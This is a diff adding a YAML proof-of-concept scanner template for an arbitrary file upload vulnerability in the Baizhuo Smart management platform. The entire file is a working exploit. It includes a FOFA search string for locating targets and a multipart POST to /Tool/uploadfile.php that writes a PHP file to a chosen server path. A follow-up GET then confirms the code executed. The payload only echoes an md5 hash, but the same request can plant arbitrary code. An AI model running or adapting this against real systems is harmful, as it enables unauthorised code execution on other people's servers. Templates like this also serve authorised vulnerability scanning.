@@ -1,0 +1,38 @@
+id: poc-yaml-byzro-smart-uploadfile-php-anyfile-upload
+info:
+  name: 百卓网络 Smart 管理平台 uploadfile.php 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 百卓 Smart--管理平台
+  fofa: body="Smart--管理平台"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /Tool/uploadfile.php?
+  headers:
+    Content-Type: multipart/form-data; boundary=---------------------------13979701222747646634037182887
+  data: '-----------------------------13979701222747646634037182887
+
+    Content-Disposition: form-data; name="file_upload"; filename="contents.php"
+
+    Content-Type: application/octet-stream
+
+
+    <?php echo md5({{.t1}});?>
+
+    -----------------------------13979701222747646634037182887
+
+    Content-Disposition: form-data; name="txt_path"
+
+
+    /home/{{.t1}}.php
+
+    -----------------------------13979701222747646634037182887--'
+  expression: status_code == 200 && contains(body,"href=uploadfile.php")
+- method: GET
+  path: /home/{{.t1}}.php
+  expression: status_code == 200 && body == t2
+transport: http
